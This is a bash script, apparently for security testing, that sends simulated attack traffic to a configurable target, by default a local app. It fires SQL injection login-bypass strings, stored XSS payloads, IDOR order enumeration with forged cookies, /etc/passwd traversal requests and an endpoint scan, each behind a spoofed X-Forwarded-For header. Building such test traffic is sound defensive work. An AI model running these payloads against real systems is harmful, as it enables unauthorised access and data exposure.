#!/bin/bash
# attack_simulation.sh - Simulate attack traffic for testing

TARGET="${TARGET_URL:-http://localhost:3000}"
ATTACKER_IP="${ATTACKER_IP:-192.168.1.100}"

echo "=== Attack Simulation Started ==="
echo "Target: $TARGET"
echo "Attacker IP: $ATTACKER_IP"

# SQL Injection attacks
echo "[SQLi] Attempting login bypass..."
for i in {1..10}; do
    curl -s -X POST "$TARGET/login" \
        -H "X-Forwarded-For: $ATTACKER_IP" \
        -d "username=admin'--&password=anything" \
        -H "Content-Type: application/x-www-form-urlencoded" > /dev/null
    curl -s -X POST "$TARGET/login" \
        -H "X-Forwarded-For: $ATTACKER_IP" \
        -d "username=admin' OR '1'='1&password=x" \
        -H "Content-Type: application/x-www-form-urlencoded" > /dev/null
    sleep 0.5
done

# XSS attacks
echo "[XSS] Posting malicious content..."
for i in {1..5}; do
    curl -s -X POST "$TARGET/board" \
        -H "X-Forwarded-For: $ATTACKER_IP" \
        -d "content=<script>alert('xss')</script>" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: user=attacker;isAdmin=false;user_id=999" > /dev/null
    curl -s -X POST "$TARGET/board" \
        -H "X-Forwarded-For: $ATTACKER_IP" \
        -d "content=<img src=x onerror=alert(1)>" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: user=attacker;isAdmin=false;user_id=999" > /dev/null
    sleep 0.5
done

# IDOR attempts
echo "[IDOR] Trying to access other users' orders..."
for id in 1 2 3 4 5; do
    curl -s "$TARGET/order?id=$id" \
        -H "X-Forwarded-For: $ATTACKER_IP" \
        -H "Cookie: user=attacker;isAdmin=false;user_id=999" > /dev/null
    sleep 0.3
done

# Directory traversal attempts
echo "[Traversal] Trying path traversal..."
curl -s "$TARGET/../../../etc/passwd" -H "X-Forwarded-For: $ATTACKER_IP" > /dev/null
curl -s "$TARGET/profile/../../etc/passwd" -H "X-Forwarded-For: $ATTACKER_IP" > /dev/null

# Repeated requests (scanning behavior)
echo "[Scan] Rapid endpoint scanning..."
for endpoint in / /login /signup /board /profile /order /admin/users /admin/products; do
    curl -s "$TARGET$endpoint" -H "X-Forwarded-For: $ATTACKER_IP" > /dev/null
    sleep 0.1
done

echo "=== Attack Simulation Complete ==="
